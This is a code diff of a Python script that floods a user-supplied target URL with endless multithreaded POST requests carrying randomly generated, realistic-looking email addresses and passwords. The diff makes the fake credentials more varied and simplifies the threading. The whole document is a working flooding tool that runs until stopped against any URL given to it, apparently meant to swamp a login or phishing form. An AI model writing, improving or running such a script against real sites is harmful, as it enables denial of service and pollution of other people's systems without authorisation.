@@ -2,51 +2,43 @@ import threading
 import requests
 import random
 import string
+import names
 
-# List of names to generate email addresses
-names = ["alice", "bob", "charlie", "dave", "eve" "fred", "george",
-          "harry", "ivan", "james", "kyle", "larry", "mike", "noah", "oliver", "peter", 
-          "quincy", "ricky", "samuel", "tom", "ulysses", "victor", "wesley", "xavier", 
-          "yusuf", "zachary",
-          ]
+def name_gen():#Generates a random name for the email
+    name_system = random.choice(["FullName", "FullFirstFirstInitial", "FirstInitialFullLast"])
+    first_name = names.get_first_name()
+    last_name = names.get_last_name()
+    if name_system == "FullName":#JohnDoe
+        return first_name + last_name
+    elif name_system == "FullFirstFirstInitial":#JohnD
+        return first_name + last_name[0]
+    return first_name[0] + last_name#JDoe
 
 def generate_random_email():
-    name = random.choice(names)
-    domain = "@gmail.com"  # You can change this domain
+    name = name_gen()
+    domain = random.choice(["@gmail.com", "@yahoo.com", "@rambler.ru", "@protonmail.com", "@outlook.com", "@itunes.com"])#Popular email providers
     return name + str(random.randint(1, 100)) + domain
 
 def generate_random_password():
-    # Generate a random password of length 8
-    letters_and_digits = string.ascii_letters + string.digits
-    return ''.join(random.choice(letters_and_digits) for i in range(8))
+    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(8))
 
 def send_posts(url):
     while True:
         email = generate_random_email()
         password = generate_random_password()
-        data = {
-            "a": email,
-            "az": password
-        }
+        data = {"a": email, "az": password}
         response = requests.post(url, data=data)
         print(f"Email: {email}, Password: {password}, Status Code: {response.status_code}")
 
 def main():
-    # Ask user for URL to flood
     url = input("Enter the URL of the target you want to flood: ")
+    threads = [threading.Thread(target=send_posts, args=(url,), daemon=True) for _ in range(25)]
 
-    threads = []
+    for t in threads:
+        t.start()
 
-    for i in range(50):
-        t = threading.Thread(target=send_posts, args=(url,))
-        t.daemon = True
-        threads.append(t)
-
-    for i in range(50):
-        threads[i].start()
-
-    for i in range(50):
-        threads[i].join()
+    for t in threads:
+        t.join()
 
 if __name__ == "__main__":
     main()
